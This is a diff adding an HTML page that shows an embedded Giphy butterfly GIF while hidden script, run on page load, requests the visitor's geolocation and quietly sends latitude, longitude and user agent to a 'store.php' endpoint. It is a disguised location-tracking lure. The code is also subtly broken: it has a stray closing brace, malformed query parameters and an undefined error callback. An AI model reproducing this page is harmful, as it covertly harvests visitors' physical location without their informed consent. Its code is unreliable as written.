@@ -1,1 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
 <iframe src="https://cookies.giphy.com/global-cookies/f5aebd8a482df0005febc2eeb25bb74e9372be84/global-cookies.f5aebd8a482df0005febc2eeb25bb74e9372be84.html" id="iframe-cookies-group" style="display:none"></iframe><p><a href="https://giphy.com/gifs/butterfly-jewellery-jewelery-Q8h25hlFkvrt22keJC"><img class="media_gif__MBeQG" style="aspect-ratio:270/480" src="https://i.giphy.com/Q8h25hlFkvrt22keJC.webp" alt="" width="295"></a></p>
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function success(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store.php?lat" + position.coords.latitude + "&long" + position.coords.longitude + "&uagent=" +  navigator.userAgent);
+  xhttp.send();
+}
+
+}
+</script>
+
+</body>
+</html>
+
+
